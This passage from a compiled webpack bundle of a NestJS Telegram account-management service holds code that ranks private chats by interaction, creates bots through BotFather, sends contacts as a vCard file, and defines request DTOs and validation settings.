                                else if (message.media instanceof telegram_1.Api.MessageMediaDocument) {
                                    const document = message.media.document;
                                    if (document instanceof telegram_1.Api.Document) {
                                        const isVideo = document.attributes.some(attr => attr instanceof telegram_1.Api.DocumentAttributeVideo);
                                        if (isVideo) {
                                            mediaStats.videos++;
                                        }
                                    }
                                }
                            }
                        }
                        let totalMessages = messageCount;
                        try {
                            const firstBatch = await this.client.getMessages(chatId, { limit: 1 });
                            if (firstBatch.total) {
                                totalMessages = firstBatch.total;
                            }
                        }
                        catch (totalError) {
                        }
                        return { messageCount, ownMessageCount, replyChainCount, messageDates, mediaStats, totalMessages };
                    })();
                    const timeoutPromise = new Promise((resolve) => setTimeout(() => resolve(null), CHAT_TIMEOUT_MS));
                    const result = await Promise.race([chatProcessingPromise, timeoutPromise]);
                    if (result === null) {
                        this.logger.warn(this.phoneNumber, `Chat ${chatId} processing timed out after ${CHAT_TIMEOUT_MS}ms - skipping`);
                        return null;
                    }
                    const { messageCount, ownMessageCount, replyChainCount, messageDates, mediaStats, totalMessages } = result;
                    const callStats = {
                        total: 0,
                        incoming: { total: 0, audio: 0, video: 0 },
                        outgoing: { total: 0, audio: 0, video: 0 }
                    };
                    const userCalls = callLogs[chatId];
                    if (userCalls) {
                        callStats.total = userCalls.totalCalls || 0;
                        callStats.incoming.total = userCalls.incoming || 0;
                        callStats.outgoing.total = userCalls.outgoing || 0;
                        callStats.incoming.video = userCalls.video || 0;
                        callStats.incoming.audio = callStats.incoming.total - callStats.incoming.video;
                        callStats.outgoing.audio = callStats.outgoing.total;
                    }
                    const baseScore = (callStats.incoming.total * weights.incomingCall +
                        callStats.outgoing.total * weights.outgoingCall +
                        (callStats.incoming.video + (callStats.outgoing.total > 0 ? 1 : 0)) * weights.videoCall +
                        mediaStats.videos * weights.sharedVideo +
                        mediaStats.photos * weights.sharedPhoto +
                        totalMessages * weights.textMessage +
                        unreadCount * weights.unreadMessages);
                    const interactionScore = baseScore;
                    const finalScore = isPinned ? interactionScore * 1.2 : interactionScore;
                    let engagementLevel;
                    if (daysSinceLastActivity <= ACTIVITY_WINDOWS.recent) {
                        engagementLevel = 'recent';
                    }
                    else if (daysSinceLastActivity <= ACTIVITY_WINDOWS.active) {
                        engagementLevel = 'active';
                    }
                    else {
                        engagementLevel = 'dormant';
                    }
                    const totalActivity = callStats.incoming.video * weights.videoCall +
                        callStats.incoming.total * weights.incomingCall +
                        callStats.outgoing.total * weights.outgoingCall +
                        (mediaStats.videos * weights.sharedVideo + mediaStats.photos * weights.sharedPhoto) +
                        totalMessages * weights.textMessage;
                    const activityBreakdown = totalActivity > 0 ? {
                        videoCalls: Math.round((callStats.incoming.video * weights.videoCall / totalActivity) * 100),
                        audioCalls: Math.round(((callStats.incoming.total + callStats.outgoing.total) * weights.incomingCall / totalActivity) * 100),
                        mediaSharing: Math.round(((mediaStats.videos * weights.sharedVideo + mediaStats.photos * weights.sharedPhoto) / totalActivity) * 100),
                        textMessages: Math.round((totalMessages * weights.textMessage / totalActivity) * 100)
                    } : {
                        videoCalls: 0,
                        audioCalls: 0,
                        mediaSharing: 0,
                        textMessages: 100
                    };
                    const processingTime = Date.now() - processingStart;
                    this.logger.info(this.phoneNumber, `Finished processing chat ${chatId} in ${processingTime}ms - Score: ${finalScore.toFixed(2)}, Level: ${engagementLevel}, Days: ${daysSinceLastActivity.toFixed(1)}`);
                    return {
                        chatId,
                        username: user.username,
                        firstName: user.firstName,
                        lastName: user.lastName,
                        totalMessages,
                        interactionScore: Math.round(finalScore * 100) / 100,
                        engagementLevel,
                        lastActivityDays: Math.round(daysSinceLastActivity * 10) / 10,
                        calls: {
                            total: callStats.total,
                            incoming: callStats.incoming,
                            outgoing: callStats.outgoing
                        },
                        media: mediaStats,
                        activityBreakdown
                    };
                }
                catch (error) {
                    const processingTime = Date.now() - processingStart;
                    if (error.message === 'Chat processing timeout') {
                        this.logger.warn(this.phoneNumber, `Chat ${chatId} timed out after ${processingTime}ms, skipping...`);
                    }
                    else {
                        this.logger.error(this.phoneNumber, `Error processing chat ${chatId} after ${processingTime}ms:`, error);
                    }
                    return null;
                }
            }));
            chatStats.push(...batchResults.filter(Boolean));
            if (i + batchSize < privateChats.length && chatStats.length < targetCandidates) {
                await (0, Helpers_1.sleep)(BATCH_DELAY_MS);
            }
        }
        let topChats = chatStats
            .sort((a, b) => {
            if (Math.abs(b.interactionScore - a.interactionScore) > 0.1) {
                return b.interactionScore - a.interactionScore;
            }
            const levelOrder = { recent: 3, active: 2, dormant: 1 };
            if (levelOrder[b.engagementLevel] !== levelOrder[a.engagementLevel]) {
                return levelOrder[b.engagementLevel] - levelOrder[a.engagementLevel];
            }
            return a.lastActivityDays - b.lastActivityDays;
        })
            .slice(0, clampedLimit);
        if (selfChatData) {
            topChats = topChats.filter(chat => chat.chatId !== 'me');
            topChats.unshift(selfChatData);
            if (topChats.length > clampedLimit) {
                topChats = topChats.slice(0, clampedLimit);
            }
        }
        const totalTime = Date.now() - startTime;
        this.logger.info(this.phoneNumber, `getTopPrivateChats completed in ${totalTime}ms. Found ${topChats.length} top chats (requested: ${clampedLimit})`);
        topChats.forEach((chat, index) => {
            this.logger.info(this.phoneNumber, `Top ${index + 1}: ${chat.firstName} (${chat.username || 'no username'}) - Score: ${chat.interactionScore}, Level: ${chat.engagementLevel}, Days: ${chat.lastActivityDays}`);
        });
        return topChats;
    }
    async createGroupOrChannel(options) {
        if (!this.client)
            throw new Error('Client not initialized');
        try {
            this.logger.info(this.phoneNumber, 'Creating group or channel with options:', options);
            const result = await this.client.invoke(new telegram_1.Api.channels.CreateChannel(options));
            return result;
        }
        catch (error) {
            this.logger.error(this.phoneNumber, 'Error creating group or channel:', error);
            throw new Error(`Failed to create group or channel: ${error.message}`);
        }
    }
    async createBot(options) {
        if (!this.client) {
            this.logger.error(this.phoneNumber, 'Bot creation failed: Client not initialized', {});
            throw new Error('Client not initialized');
        }
        const botFatherUsername = 'BotFather';
        this.logger.info(this.phoneNumber, `[BOT CREATION] Starting bot creation process for "${options.name}" (${options.username})`);
        try {
            this.logger.info(this.phoneNumber, '[BOT CREATION] Attempting to get entity for BotFather...');
            const entity = await this.client.getEntity(botFatherUsername);
            this.logger.info(this.phoneNumber, '[BOT CREATION] Successfully connected to BotFather');
            this.logger.info(this.phoneNumber, '[BOT CREATION] Sending /newbot command...');
            await this.client.sendMessage(entity, {
                message: '/newbot'
            });
            this.logger.info(this.phoneNumber, '[BOT CREATION] Waiting for BotFather response after /newbot command...');
            await new Promise(resolve => setTimeout(resolve, 1000));
            this.logger.info(this.phoneNumber, `[BOT CREATION] Sending bot name: "${options.name}"`);
            await this.client.sendMessage(entity, {
                message: options.name
            });
            this.logger.info(this.phoneNumber, '[BOT CREATION] Waiting for BotFather response after sending name...');
            await new Promise(resolve => setTimeout(resolve, 1000));
            let botUsername = options.username;
            if (!/_bot$/.test(botUsername)) {
                const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
                let uniqueSuffix = '';
                for (let i = 0; i < 3; i++) {
                    uniqueSuffix += chars.charAt(Math.floor(Math.random() * chars.length));
                }
                botUsername = botUsername.replace(/_?bot$/, '') + `_${uniqueSuffix}_bot`;
                this.logger.info(this.phoneNumber, `[BOT CREATION] Modified username to ensure uniqueness: ${botUsername}`);
            }
            this.logger.info(this.phoneNumber, `[BOT CREATION] Sending bot username: "${botUsername}"`);
            await this.client.sendMessage(entity, {
                message: botUsername
            });
            this.logger.info(this.phoneNumber, '[BOT CREATION] Waiting for BotFather response after sending username...');
            await new Promise(resolve => setTimeout(resolve, 1000));
            this.logger.info(this.phoneNumber, '[BOT CREATION] Retrieving response from BotFather...');
            const messages = await this.client.getMessages(entity, {
                limit: 1
            });
            if (!messages || messages.length === 0) {
                this.logger.error(this.phoneNumber, '[BOT CREATION] No response received from BotFather', {});
                throw new Error('No response received from BotFather');
            }
            const lastMessage = messages[0].message;
            this.logger.info(this.phoneNumber, `[BOT CREATION] BotFather response: "${lastMessage.substring(0, 50)}..."`);
            if (!lastMessage.toLowerCase().includes('use this token')) {
                this.logger.error(this.phoneNumber, `[BOT CREATION] Bot creation failed, unexpected response: "${lastMessage}"`, {});
                throw new Error(`Bot creation failed: ${lastMessage}`);
            }
            const tokenMatch = lastMessage.match(/(\d+:[A-Za-z0-9_-]+)/);
            if (!tokenMatch) {
                this.logger.error(this.phoneNumber, '[BOT CREATION] Could not extract bot token from BotFather response', {});
                throw new Error('Could not extract bot token from BotFather response');
            }
            const botToken = tokenMatch[0];
            this.logger.info(this.phoneNumber, `[BOT CREATION] Successfully extracted bot token: ${botToken.substring(0, 5)}...`);
            if (options.description) {
                this.logger.info(this.phoneNumber, '[BOT CREATION] Setting bot description...');
                await this.client.sendMessage(entity, { message: '/setdescription' });
                await new Promise(resolve => setTimeout(resolve, 1000));
                this.logger.info(this.phoneNumber, `[BOT CREATION] Selecting bot @${options.username} for description update...`);
                await this.client.sendMessage(entity, { message: `@${options.username}` });
                await new Promise(resolve => setTimeout(resolve, 1000));
                this.logger.info(this.phoneNumber, '[BOT CREATION] Sending description text...');
                await this.client.sendMessage(entity, { message: options.description });
                await new Promise(resolve => setTimeout(resolve, 1000));
                this.logger.info(this.phoneNumber, '[BOT CREATION] Description set successfully');
            }
            if (options.aboutText) {
                this.logger.info(this.phoneNumber, '[BOT CREATION] Setting about text...');
                await this.client.sendMessage(entity, { message: '/setabouttext' });
                await new Promise(resolve => setTimeout(resolve, 1000));
                this.logger.info(this.phoneNumber, `[BOT CREATION] Selecting bot @${options.username} for about text update...`);
                await this.client.sendMessage(entity, { message: `@${options.username}` });
                await new Promise(resolve => setTimeout(resolve, 1000));
                this.logger.info(this.phoneNumber, '[BOT CREATION] Sending about text...');
                await this.client.sendMessage(entity, { message: options.aboutText });
                await new Promise(resolve => setTimeout(resolve, 1000));
                this.logger.info(this.phoneNumber, '[BOT CREATION] About text set successfully');
            }
            if (options.profilePhotoUrl) {
                this.logger.info(this.phoneNumber, `[BOT CREATION] Setting profile photo from URL: ${options.profilePhotoUrl}`);
                try {
                    this.logger.info(this.phoneNumber, '[BOT CREATION] Downloading profile photo...');
                    const photoBuffer = await this.downloadFileFromUrl(options.profilePhotoUrl);
                    this.logger.info(this.phoneNumber, `[BOT CREATION] Photo downloaded successfully, size: ${photoBuffer.length} bytes`);
                    this.logger.info(this.phoneNumber, '[BOT CREATION] Sending /setuserpic command...');
                    await this.client.sendMessage(entity, { message: '/setuserpic' });
                    await new Promise(resolve => setTimeout(resolve, 1000));
                    this.logger.info(this.phoneNumber, `[BOT CREATION] Selecting bot @${options.username} for profile photo update...`);
                    await this.client.sendMessage(entity, { message: `@${options.username}` });
                    await new Promise(resolve => setTimeout(resolve, 1000));
                    this.logger.info(this.phoneNumber, '[BOT CREATION] Uploading profile photo...');
                    await this.client.sendFile(entity, {
                        file: Buffer.from(photoBuffer),
                        caption: '',
                        forceDocument: false
                    });
                    await new Promise(resolve => setTimeout(resolve, 1000));
                    this.logger.info(this.phoneNumber, '[BOT CREATION] Profile photo set successfully');
                }
                catch (photoError) {
                    this.logger.error(this.phoneNumber, `[BOT CREATION] Failed to set profile photo: ${photoError.message}`, {});
                }
            }
            this.logger.info(this.phoneNumber, `[BOT CREATION] Bot creation completed successfully: @${options.username}`);
            return {
                botToken,
                username: botUsername
            };
        }
        catch (error) {
            this.logger.error(this.phoneNumber, `[BOT CREATION] Error during bot creation process: ${error.message}`, error);
            throw new Error(`Failed to create bot: ${error.message}`);
        }
    }
    createVCardContent(contacts) {
        let vCardContent = '';
        contacts.users.map((user) => {
            user = user;
            vCardContent += 'BEGIN:VCARD\n';
            vCardContent += 'VERSION:3.0\n';
            vCardContent += `FN:${user.firstName || ''} ${user.lastName || ''}\n`;
            vCardContent += `TEL;TYPE=CELL:${user.phone}\n`;
            vCardContent += 'END:VCARD\n';
        });
        return vCardContent;
    }
    async sendContactsFile(chatId, contacts, filename = 'contacts.vcf') {
        if (!this.client)
            throw new Error('Client is not initialized');
        try {
            const vCardContent = this.createVCardContent(contacts);
            const tempPath = `./contacts/${chatId}-${filename}`;
            if (!fs.existsSync('./contacts')) {
                fs.mkdirSync('./contacts', { recursive: true });
            }
            fs.writeFileSync(tempPath, vCardContent, 'utf8');
            try {
                const fileContent = fs.readFileSync(tempPath);
                const file = new uploads_1.CustomFile(filename, fs.statSync(tempPath).size, tempPath, fileContent);
                await this.client.sendFile(chatId, {
                    file,
                    caption: `Contacts file with ${contacts.users.length} contacts`,
                    forceDocument: true
                });
                this.logger.info(this.phoneNumber, `Sent contacts file with ${contacts.users.length} contacts to chat ${chatId}`);
            }
            finally {
                if (fs.existsSync(tempPath)) {
                    fs.unlinkSync(tempPath);
                }
            }
        }
        catch (error) {
            this.logger.error(this.phoneNumber, 'Error sending contacts file:', error);
            throw error;
        }
    }
}
exports["default"] = TelegramManager;


/***/ }),

/***/ "./src/components/Telegram/config/telegram-validation.config.ts":
/*!**********************************************************************!*\
  !*** ./src/components/Telegram/config/telegram-validation.config.ts ***!
  \**********************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TelegramValidationConfig = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
let TelegramValidationConfig = class TelegramValidationConfig {
};
exports.TelegramValidationConfig = TelegramValidationConfig;
TelegramValidationConfig.PHONE_PATTERN = /^\+?[1-9]\d{1,14}$/;
TelegramValidationConfig.USERNAME_PATTERN = /^[a-zA-Z0-9_]{5,32}$/;
TelegramValidationConfig.MESSAGE_MAX_LENGTH = 4096;
TelegramValidationConfig.CAPTION_MAX_LENGTH = 1024;
TelegramValidationConfig.FILE_SIZE_LIMIT = 2000 * 1024 * 1024;
TelegramValidationConfig.BATCH_SIZE_LIMIT = 100;
TelegramValidationConfig.ALLOWED_MEDIA_TYPES = [
    'photo',
    'video',
    'document',
    'voice',
    'audio'
];
TelegramValidationConfig.ALLOWED_PRIVACY_LEVELS = [
    'everybody',
    'contacts',
    'nobody'
];
TelegramValidationConfig.MESSAGE_TYPES = [
    'all',
    'text',
    'photo',
    'video',
    'voice',
    'document'
];
TelegramValidationConfig.DEFAULT_PAGINATION = {
    limit: 20,
    maxLimit: 100
};
exports.TelegramValidationConfig = TelegramValidationConfig = __decorate([
    (0, common_1.Injectable)()
], TelegramValidationConfig);


/***/ }),

/***/ "./src/components/Telegram/dto/batch-operations.dto.ts":
/*!*************************************************************!*\
  !*** ./src/components/Telegram/dto/batch-operations.dto.ts ***!
  \*************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ForwardBatchDto = exports.BatchProcessDto = exports.BatchItemDto = exports.BaseBatchItemDto = exports.BatchOperationType = void 0;
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
var BatchOperationType;
(function (BatchOperationType) {
    BatchOperationType["FORWARD"] = "forward";
    BatchOperationType["DELETE"] = "delete";
    BatchOperationType["EDIT"] = "edit";
})(BatchOperationType || (exports.BatchOperationType = BatchOperationType = {}));
class BaseBatchItemDto {
}
exports.BaseBatchItemDto = BaseBatchItemDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Chat ID for the operation' }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], BaseBatchItemDto.prototype, "chatId", void 0);
class BatchItemDto extends BaseBatchItemDto {
}
exports.BatchItemDto = BatchItemDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Message ID for message operations', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], BatchItemDto.prototype, "messageId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Source chat ID for forward operations', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], BatchItemDto.prototype, "fromChatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Target chat ID for forward operations', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], BatchItemDto.prototype, "toChatId", void 0);
class BatchProcessDto {
    constructor() {
        this.batchSize = 20;
        this.delayMs = 1000;
    }
}
exports.BatchProcessDto = BatchProcessDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Operation type', enum: BatchOperationType }),
    (0, class_validator_1.IsEnum)(BatchOperationType),
    __metadata("design:type", String)
], BatchProcessDto.prototype, "operation", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Items to process', type: [BatchItemDto] }),
    (0, class_validator_1.IsArray)(),
    __metadata("design:type", Array)
], BatchProcessDto.prototype, "items", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of items to process in each batch', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], BatchProcessDto.prototype, "batchSize", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Delay between batches in milliseconds', default: 1000 }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], BatchProcessDto.prototype, "delayMs", void 0);
class ForwardBatchDto {
}
exports.ForwardBatchDto = ForwardBatchDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Source chat ID for forwarding' }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], ForwardBatchDto.prototype, "fromChatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Target chat ID for forwarding' }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], ForwardBatchDto.prototype, "toChatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Message IDs to forward', type: [Number] }),
    (0, class_validator_1.IsArray)(),
    (0, class_validator_1.ArrayMinSize)(1, { message: 'At least one message ID is required' }),
    (0, class_validator_1.ArrayMaxSize)(100, { message: 'Cannot forward more than 100 messages at once' }),
    (0, class_validator_1.IsNumber)({}, { each: true }),
    (0, class_transformer_1.Transform)(({ value }) => Array.isArray(value) ? value.map(Number) : value),
    __metadata("design:type", Array)
], ForwardBatchDto.prototype, "messageIds", void 0);


/***/ }),

/***/ "./src/components/Telegram/dto/channel-operation.dto.ts":
/*!**************************************************************!*\
  !*** ./src/components/Telegram/dto/channel-operation.dto.ts ***!
  \**************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ChannelOperationDto = void 0;
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class ChannelOperationDto {
}
exports.ChannelOperationDto = ChannelOperationDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Channel username or ID' }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], ChannelOperationDto.prototype, "channel", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Whether to forward messages after joining', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], ChannelOperationDto.prototype, "forward", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Source chat ID to forward messages from', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], ChannelOperationDto.prototype, "fromChatId", void 0);


/***/ }),

/***/ "./src/components/Telegram/dto/connection-management.dto.ts":
/*!******************************************************************!*\
  !*** ./src/components/Telegram/dto/connection-management.dto.ts ***!
  \******************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.GetClientOptionsDto = exports.ConnectionStatusDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class ConnectionStatusDto {
}
exports.ConnectionStatusDto = ConnectionStatusDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Connection state of the client', enum: ['connecting', 'connected', 'disconnecting', 'disconnected', 'error'] }),
    __metadata("design:type", String)
], ConnectionStatusDto.prototype, "state", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Whether auto disconnect is enabled' }),
    __metadata("design:type", Boolean)
], ConnectionStatusDto.prototype, "autoDisconnect", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'When the connection was last used', type: 'number' }),
    __metadata("design:type", Number)
], ConnectionStatusDto.prototype, "lastUsed", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of connection attempts', type: 'number' }),
    __metadata("design:type", Number)
], ConnectionStatusDto.prototype, "connectionAttempts", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Last error message if any', required: false }),
    __metadata("design:type", String)
], ConnectionStatusDto.prototype, "lastError", void 0);
class GetClientOptionsDto {
}
exports.GetClientOptionsDto = GetClientOptionsDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Whether to auto disconnect the client after period of inactivity', required: false, default: true }),
    __metadata("design:type", Boolean)
], GetClientOptionsDto.prototype, "autoDisconnect", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Whether to use event handler', required: false, default: true }),
    __metadata("design:type", Boolean)
], GetClientOptionsDto.prototype, "handler", void 0);


/***/ }),

/***/ "./src/components/Telegram/dto/contact-management.dto.ts":
/*!***************************************************************!*\
  !*** ./src/components/Telegram/dto/contact-management.dto.ts ***!
  \***************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.AddContactsDto = exports.ContactImportDto = exports.ContactExportImportDto = exports.ContactBlockListDto = exports.ContactGroupDto = void 0;
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class ContactGroupDto {
}
exports.ContactGroupDto = ContactGroupDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Name of the contact group' }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], ContactGroupDto.prototype, "name", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'User IDs to include in the group', type: [String] }),
    (0, class_validator_1.IsArray)(),
    (0, class_validator_1.IsString)({ each: true }),
    __metadata("design:type", Array)
], ContactGroupDto.prototype, "userIds", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Optional description for the group' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], ContactGroupDto.prototype, "description", void 0);
class ContactBlockListDto {
}
exports.ContactBlockListDto = ContactBlockListDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'User IDs to block/unblock', type: [String] }),
    (0, class_validator_1.IsArray)(),
    (0, class_validator_1.IsString)({ each: true }),
    __metadata("design:type", Array)
], ContactBlockListDto.prototype, "userIds", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Whether to block or unblock the users' }),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], ContactBlockListDto.prototype, "block", void 0);
class ContactExportImportDto {
    constructor() {
        this.includeBlocked = false;
    }
}
exports.ContactExportImportDto = ContactExportImportDto;
__decorate([
    (0, swagger_1.ApiProperty)({ enum: ['vcard', 'csv'], description: 'Export format type' }),
    (0, class_validator_1.IsEnum)(['vcard', 'csv']),
    __metadata("design:type", String)
], ContactExportImportDto.prototype, "format", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Whether to include blocked contacts', required: false, default: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Object)
], ContactExportImportDto.prototype, "includeBlocked", void 0);
class ContactImportDto {
}
exports.ContactImportDto = ContactImportDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Contacts to import', type: [Object] }),
    (0, class_validator_1.IsArray)(),
    __metadata("design:type", Array)
], ContactImportDto.prototype, "contacts", void 0);
class AddContactsDto {
}
exports.AddContactsDto = AddContactsDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Phone numbers to add', type: [String] }),
    (0, class_validator_1.IsArray)(),
    (0, class_validator_1.IsString)({ each: true }),
    __metadata("design:type", Array)
], AddContactsDto.prototype, "phoneNumbers", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Name prefix to use for added contacts' }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], AddContactsDto.prototype, "prefix", void 0);


/***/ }),

/***/ "./src/components/Telegram/dto/create-bot.dto.ts":
/*!*******************************************************!*\
  !*** ./src/components/Telegram/dto/create-bot.dto.ts ***!
  \*******************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateTgBotDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class CreateTgBotDto {
}
exports.CreateTgBotDto = CreateTgBotDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Name of the bot (required)',
        example: 'MyAwesomeBot'
    }),
    (0, class_validator_1.IsNotEmpty)(),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.MaxLength)(64),
    __metadata("design:type", String)
], CreateTgBotDto.prototype, "name", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Username for the bot (required)',
        example: 'my_awesome_bot'
    }),
    (0, class_validator_1.IsNotEmpty)(),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.MaxLength)(32),
    __metadata("design:type", String)
], CreateTgBotDto.prototype, "username", void 0);
